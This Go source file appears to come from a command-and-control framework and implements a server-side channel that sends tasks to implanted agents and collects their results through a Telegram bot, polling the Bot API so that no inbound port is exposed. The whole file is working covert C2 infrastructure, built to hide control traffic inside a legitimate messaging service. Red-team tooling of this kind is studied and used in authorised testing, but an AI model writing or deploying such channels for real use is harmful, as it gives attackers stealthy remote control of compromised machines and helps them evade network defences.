package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"
)

// TelegramExternalC2 relays ExtC2 tasks and results through a Telegram bot
// using long-polling (getUpdates) against the Bot API. No inbound webhook or
// publicly exposed port is required, mirroring the Discord/Slack channel model.
//
// Wire format: agents post extC2WSMessage JSON as the message text, so the
// result path (HMAC-gated) matches Discord/Slack exactly.
type TelegramExternalC2 struct {
	server     *Server
	botToken   string
	chatID     string
	offset     int64
	mu         sync.Mutex
	running    bool
	stopCh     chan struct{}
	httpClient *http.Client
}

func NewTelegramExternalC2(s *Server, botToken, chatID string) *TelegramExternalC2 {
	return &TelegramExternalC2{
		server:     s,
		botToken:   botToken,
		chatID:     chatID,
		stopCh:     make(chan struct{}),
		httpClient: &http.Client{Timeout: 15 * time.Second},
	}
}

func (t *TelegramExternalC2) Start() error {
	t.mu.Lock()
	if t.running {
		t.mu.Unlock()
		return nil
	}
	t.running = true
	t.stopCh = make(chan struct{})
	t.mu.Unlock()

	channelID := "extc2-telegram-" + t.chatID
	slog.Info("Telegram External C2 starting", "chat_id", t.chatID)
	if t.server.cfg == nil || strings.TrimSpace(t.server.cfg.Crypto.ExtC2Key) == "" {
		slog.Warn("Telegram ExtC2 running WITHOUT result HMAC: set crypto.extc2_key to require signed results")
	}

	t.server.extC2ChannelsMu.Lock()
	t.server.extC2Channels[channelID] = &extC2WSChannel{
		ID:        channelID,
		Type:      "telegram",
		CreatedAt: time.Now(),
	}
	t.server.extC2ChannelsMu.Unlock()

	go t.runLoop(channelID)
	return nil
}

func (t *TelegramExternalC2) runLoop(channelID string) {
	wait := 5 * time.Second
	const maxWait = 60 * time.Second
	for {
		t.connectAndRun(channelID)
		select {
		case <-t.stopCh:
			slog.Info("Telegram External C2 stopped", "chat_id", t.chatID)
			return
		default:
			slog.Info("Telegram External C2 reconnecting", "chat_id", t.chatID, "wait", wait)
			time.Sleep(wait)
			wait *= 2
			if wait > maxWait {
				wait = maxWait
			}
		}
	}
}

func (t *TelegramExternalC2) connectAndRun(channelID string) {
	defer t.cleanupChannel(channelID)

	t.server.extC2TaskMu.Lock()
	t.server.extC2Notify[channelID] = make(chan struct{}, 1)
	t.server.extC2TaskMu.Unlock()

	taskSenderDone := make(chan struct{})
	go func() {
		defer close(taskSenderDone)
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			t.server.extC2TaskMu.Lock()
			notifyCh := t.server.extC2Notify[channelID]
			t.server.extC2TaskMu.Unlock()
			select {
			case <-t.stopCh:
				return
			case <-notifyCh:
			case <-ticker.C:
			}
			t.server.extC2TaskMu.Lock()
			tasks := t.server.extC2TaskQueue[channelID]
			t.server.extC2TaskQueue[channelID] = nil
			t.server.extC2TaskMu.Unlock()
			for _, task := range tasks {
				taskJSON, ok := marshalJSONSafe(task)
				if !ok {
					continue
				}
				if err := t.sendMessage(string(taskJSON)); err != nil {
					slog.Error("Telegram External C2 send failed", "error", err)
				}
			}
		}
	}()

	// Long-poll for agent messages. getUpdates blocks server-side for up to
	// timeout seconds; a zero result just loops with the same offset.
	for {
		select {
		case <-t.stopCh:
			<-taskSenderDone
			return
		default:
		}
		updates, err := t.getUpdates()
		if err != nil {
			slog.Warn("Telegram getUpdates failed", "error", err)
			time.Sleep(3 * time.Second)
			continue
		}
		for _, u := range updates {
			// Always advance the offset so already-delivered updates are not
			// re-read, even if unmarshalling the inbound text fails.
			if u.UpdateID+1 > t.offset {
				t.offset = u.UpdateID + 1
			}
			if u.Message == nil || strings.TrimSpace(u.Message.Text) == "" {
				continue
			}
			t.processMessage(u.Message.Text, channelID)
		}
	}
}

func (t *TelegramExternalC2) processMessage(text, channelID string) {
	var extMsg extC2WSMessage
	if err := json.Unmarshal([]byte(text), &extMsg); err != nil {
		return
	}
	if extMsg.Type != "result" {
		return
	}
	if !t.server.verifyExtC2ResultHMAC(extMsg.AgentID, extMsg.TaskID, extMsg.ResultID, extMsg.Result, extMsg.HMAC) {
		slog.Warn("Telegram ExtC2 result dropped: HMAC verification failed", "agent_id", extMsg.AgentID, "task_id", extMsg.TaskID)
		return
	}
	t.server.processExternalC2Result(extMsg.AgentID, extMsg.TaskID, extMsg.ResultID, extMsg.Result)
}

func (t *TelegramExternalC2) getUpdates() ([]telegramUpdate, error) {
	var body bytes.Buffer
	json.NewEncoder(&body).Encode(map[string]interface{}{
		"offset":          t.offset,
		"timeout":         50,
		"allowed_updates": []string{"message"},
	})
	req, err := http.NewRequest("POST", t.apiURL("getUpdates"), &body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := t.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var out struct {
		OK     bool             `json:"ok"`
		Result []telegramUpdate `json:"result"`
	}
	if err := json.Unmarshal(data, &out); err != nil {
		return nil, err
	}
	if !out.OK {
		return nil, fmt.Errorf("telegram api error: %s", string(data))
	}
	return out.Result, nil
}

func (t *TelegramExternalC2) sendMessage(text string) error {
	var body bytes.Buffer
	json.NewEncoder(&body).Encode(map[string]interface{}{
		"chat_id": t.chatID,
		"text":    text,
	})
	req, err := http.NewRequest("POST", t.apiURL("sendMessage"), &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := t.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("telegram sendMessage failed (%d): %s", resp.StatusCode, string(data))
	}
	return nil
}

func (t *TelegramExternalC2) apiURL(method string) string {
	return fmt.Sprintf("https://api.telegram.org/bot%s/%s", t.botToken, method)
}

func (t *TelegramExternalC2) cleanupChannel(channelID string) {
	t.server.extC2TaskMu.Lock()
	if q, ok := t.server.extC2TaskQueue[channelID]; ok && len(q) > 0 {
		slog.Warn("Telegram ExtC2 channel closing with pending tasks", "channel", channelID, "count", len(q))
	}
	delete(t.server.extC2TaskQueue, channelID)
	delete(t.server.extC2Notify, channelID)
	t.server.extC2TaskMu.Unlock()
}

func (t *TelegramExternalC2) Stop() {
	t.mu.Lock()
	defer t.mu.Unlock()
	if !t.running {
		return
	}
	t.running = false
	close(t.stopCh)

	channelID := "extc2-telegram-" + t.chatID
	t.server.extC2ChannelsMu.Lock()
	delete(t.server.extC2Channels, channelID)
	t.server.extC2ChannelsMu.Unlock()
}

func (t *TelegramExternalC2) IsRunning() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.running
}

type telegramUpdate struct {
	UpdateID int64            `json:"update_id"`
	Message  *telegramMessage `json:"message"`
}

type telegramMessage struct {
	Text string `json:"text"`
}
